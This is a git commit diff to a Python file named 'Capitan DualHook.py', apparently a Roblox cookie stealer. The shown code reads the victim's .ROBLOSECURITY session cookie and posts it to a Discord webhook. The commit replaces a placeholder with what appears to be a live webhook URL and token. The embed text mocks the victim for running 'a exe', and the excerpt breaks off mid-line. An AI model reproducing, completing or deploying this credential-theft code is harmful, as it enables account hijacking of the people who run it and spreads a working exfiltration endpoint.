486eb314d26858e7a811e8ade3b7734a9298fb0c
updaown-hecker <157871518+updaown-hecker@users.noreply.github.com>
2024-03-06 13:16:56 -0600

    Update Capitan DualHook.py

--- Capitan DualHook.py
+++ Capitan DualHook.py
@@ -12,7 +12,7 @@ def getCookiesFromPc():
     r = req.get("https://www.roblox.com/")
     for c in req.cookies:
         if c.name == ".ROBLOSECURITY":
-            webhook = DiscordWebhook(url='YOUR WEHBOOOOOOOOOOOK', content="@everyone")
+            webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1215014465297195038/bOa3y4fQlEspVdLk0JMF5dQCAJNpeVSapFIXwcaUERIxULvPZqp6ZC_oNSScM8oDwXgq', content="@everyone")
             embed = DiscordEmbed(title='Cookie Found of braindead person!', description='He clicked a exe!', color=242424)
             embed.add_embed_field(name='.ROBLOSECURITY', value=c.value)
             embed.set_timestamp('
